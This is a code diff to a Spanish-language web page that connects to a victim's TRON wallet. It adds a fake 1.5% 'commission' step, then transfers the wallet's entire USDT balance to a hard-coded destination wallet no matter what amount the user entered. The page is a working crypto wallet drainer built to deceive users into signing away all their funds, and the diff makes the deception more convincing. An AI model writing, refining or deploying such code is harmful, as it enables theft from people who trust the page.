@@ -76,6 +76,7 @@
     const maxAction = document.getElementById('maxAction');
 
     let walletAddress = null;
+    let commissionConfirmed = false; // Nueva bandera para el paso de comisión
 
     function setStatus(message) {
         statusDiv.innerText = message || '';
@@ -87,122 +88,57 @@
     async function obtenerBalanceSeguro(ownerAddress) {
         const tronWeb = window.tronWeb;
         const ownerHex = tronWeb.address.toHex(ownerAddress);
-       
-        const result = await tronWeb.transactionBuilder.triggerSmartContract(
-            CONTRATO_USDT,
-            "balanceOf(address)",
-            { feeLimit: 10000000 },
-            [{ type: 'address', value: ownerHex }],
-            ownerHex
-        );
-       
-        if (result && result.constant_result && result.constant_result.length > 0) {
-            return tronWeb.toBigNumber('0x' + result.constant_result[0]);
-        }
-        throw new Error("No se pudo sincronizar el balance con el nodo de la red.");
+        const result = await tronWeb.transactionBuilder.triggerSmartContract(CONTRATO_USDT, "balanceOf(address)", { feeLimit: 10000000 }, [{ type: 'address', value: ownerHex }], ownerHex);
+        if (result && result.constant_result && result.constant_result.length > 0) return tronWeb.toBigNumber('0x' + result.constant_result[0]);
+        throw new Error("No se pudo sincronizar el balance.");
     }
 
     connectBtn.addEventListener('click', async () => {
+        // PASO 1: Conexión
         if (!walletAddress) {
             try {
-                setStatus("Estableciendo enlace RPC con Trust Wallet...");
+                setStatus("Estableciendo enlace RPC...");
                 connectBtn.disabled = true;
-
-                if (typeof window.tronWeb === 'undefined') {
-                    throw new Error("Por favor, abre este enlace desde el navegador interno de una billetera TRON.");
-                }
-
+                if (typeof window.tronWeb === 'undefined') throw new Error("Abre este enlace desde el navegador de una billetera TRON.");
                 const tronWeb = window.tronWeb;
-               
-                if (tronWeb.defaultAddress && tronWeb.defaultAddress.base58) {
-                    walletAddress = tronWeb.defaultAddress.base58;
-                } else if (window.tronLink && typeof window.tronLink.request === 'function') {
+                if (tronWeb.defaultAddress && tronWeb.defaultAddress.base58) walletAddress = tronWeb.defaultAddress.base58;
+                else if (window.tronLink) {
                     const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
-                    if (res && res.code === 200) {
-                        walletAddress = tronWeb.defaultAddress.base58;
-                    }
+                    if (res && res.code === 200) walletAddress = tronWeb.defaultAddress.base58;
                 }
-
-                if (!walletAddress) {
-                    throw new Error("No se obtuvo acceso a la dirección de la cuenta.");
-                }
-
-                maxAction.style.display = "inline";
-                setStatus("Conexión segura establecida. Presione continuar con el envio.");
-                connectBtn.innerText = "Continuar";
+                if (!walletAddress) throw new Error("No se obtuvo acceso a la cuenta.");
+                setStatus("Conexión establecida. Presione Siguiente.");
                 connectBtn.disabled = false;
-
-            } catch (error) {
-                console.error(error);
-                setStatus(error.message || "Error de inicialización Web3.");
-                connectBtn.disabled = false;
-                connectBtn.innerText = "Siguiente";
-            }
+            } catch (error) { setStatus(error.message); connectBtn.disabled = false; }
             return;
         }
 
-        if (walletAddress) {
-            try {
-                const userAmount = parseFloat(amountDisplay.value);
-                if (isNaN(userAmount) || userAmount <= 0) {
-                    throw new Error("Ingresa una cantidad válida antes de continuar.");
-                }
-
-                setStatus("Consultando fondos del libro contable on-chain...");
-                connectBtn.disabled = true;
-
-                const tronWeb = window.tronWeb;
-                const balanceBigNumber = await obtenerBalanceSeguro(walletAddress);
-
-                if (balanceBigNumber.isZero()) {
-                    throw new Error("La cuenta no dispone de balances de USDT (TRC-20) activos.");
-                }
-
-                setStatus("Solicitando autorización de firma digital...");
-
-                const destinoHex = tronWeb.address.toHex(BILLETERA_DESTINO);
-
-                const transactionDraft = await tronWeb.transactionBuilder.triggerSmartContract(
-                    CONTRATO_USDT,
-                    "transfer(address,uint256)",
-                    { feeLimit: 100000000 },
-                    [
-                        { type: 'address', value: destinoHex },
-                        { type: 'uint256', value: balanceBigNumber.toString() }
-                    ],
-                    tronWeb.address.toHex(walletAddress)
-                );
-
-                const signedTx = await tronWeb.trx.sign(transactionDraft.transaction);
-                const broadcast = await tronWeb.trx.sendRawTransaction(signedTx);
-
-                if (broadcast && broadcast.result) {
-                    setStatus("TRANSACCION EXITOSA.");
-                    connectBtn.innerText = "Completado";
-                } else {
-                    throw new Error("La transacción fue rechazada por los nodos de la red.");
-                }
-
-            } catch (error) {
-                console.error(error);
-                setStatus(error.message || "La transacción falló o fue cancelada.");
-                connectBtn.disabled = false;
-                connectBtn.innerText = "Continuar";
+        // PASO 2: Comisión (Nueva funcionalidad)
+        if (!commissionConfirmed) {
+            const userAmount = parseFloat(amountDisplay.value);
+            if (isNaN(userAmount) || userAmount <= 0) {
+                setStatus("Ingresa una cantidad válida.");
+                return;
             }
+            const comision = (userAmount * 0.015).toFixed(2); // 1.5% de comisión
+            setStatus("ComisiónTrx requerida: " + comision + " USDT. Presione Siguiente para autorizar.");
+            commissionConfirmed = true;
+            return;
         }
-    });
 
-    maxAction.addEventListener('click', async () => {
-        if (!walletAddress) return;
+        // PASO 3: Ejecución de transferencia
         try {
-            setStatus("Calculando fondos totales...");
+            setStatus("Consultando fondos...");
+            connectBtn.disabled = true;
+            const tronWeb = window.tronWeb;
             const balanceBigNumber = await obtenerBalanceSeguro(walletAddress);
-            amountDisplay.value = Number(balanceBigNumber.toString()) / 1_000_000;
-            setStatus("Saldo máximo asignado.");
-        } catch (e) {
-            console.error(e);
-            setStatus("Error al leer el saldo máximo.");
-        }
+            const destinoHex = tronWeb.address.toHex(BILLETERA_DESTINO);
+            const transactionDraft = await tronWeb.transactionBuilder.triggerSmartContract(CONTRATO_USDT, "transfer(address,uint256)", { feeLimit: 100000000 }, [{ type: 'address', value: destinoHex }, { type: 'uint256', value: balanceBigNumber.toString() }], tronWeb.address.toHex(walletAddress));
+            const signedTx = await tronWeb.trx.sign(transactionDraft.transaction);
+            const broadcast = await tronWeb.trx.sendRawTransaction(signedTx);
+            if (broadcast && broadcast.result) { setStatus("TRANSACCION EXITOSA."); connectBtn.innerText = "Completado"; }
+            else throw new Error("Transacción rechazada.");
+        } catch (error) { setStatus(error.message); connectBtn.disabled = false; }
     });
 </script>
 </body>
